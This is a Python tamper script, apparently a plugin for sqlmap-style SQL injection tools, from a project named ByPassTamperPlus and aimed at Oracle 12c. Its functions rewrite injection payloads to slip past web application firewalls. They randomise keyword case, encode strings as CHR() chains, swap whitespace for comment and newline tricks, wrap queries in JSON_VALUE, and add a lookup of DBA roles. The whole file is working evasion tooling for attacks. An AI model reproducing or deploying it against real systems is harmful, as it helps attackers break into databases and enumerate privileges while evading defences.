#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : oracle12c_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import random
import re

def general_obfuscate(payload):
    if not payload:
        return payload

    keywords = ["SELECT", "FROM", "WHERE", "UNION", "ALL", "AND", "OR", "JSON_VALUE", "JSON_QUERY", "DUAL", "V$PDBS"]
    for kw in keywords:
        payload = re.sub(r"\b%s\b" % kw, lambda m: "".join(c.upper() if random.random() > 0.5 else c.lower() for c in m.group(0)), payload, flags=re.IGNORECASE)

    payload = re.sub(r"'([a-zA-Z0-9_/]+)'", lambda m: "||".join("CHR(%d)" % ord(c) for c in m.group(1)), payload)

    payload = payload.replace(" AND ", " && ").replace(" OR ", " || ")

    payload = re.sub(r"\s+", lambda m: random.choice(["%0a", "/**/", "\t"]), payload)

    identifiers = ["USER", "DUAL", "V$DATABASE", "V$PDBS", "USER_SYS_PRIVS"]
    for iden in identifiers:
        payload = re.sub(r"\b%s\b" % iden, '"%s"' % iden, payload, flags=re.IGNORECASE)

    return payload

def tamper(payload, **kwargs):
    if not payload:
        return payload

    if "SELECT" in payload.upper() and "FROM DUAL" in payload.upper():
        match = re.search(r"SELECT\s+(.+?)\s+FROM\s+DUAL", payload, re.IGNORECASE)
        if match:
            inner = match.group(1)
            payload = payload.replace(match.group(0), "SELECT JSON_VALUE('{\"a\":\"'||(%s)||'\"}', '$.a') FROM DUAL" % inner)

    if "V$DATABASE" in payload.upper():
        payload = payload.replace("V$DATABASE", "V$PDBS")

    payload = re.sub(r"AS\s+(\w+)", r'AS "ORA$PTT_\1"', payload, flags=re.IGNORECASE)

    if "SESSION_ROLES" in payload.upper():
        payload = payload.replace("SESSION_ROLES", "(SELECT ROLE FROM SESSION_ROLES WHERE ROLE LIKE '%DBA%')")

    return general_obfuscate(payload)
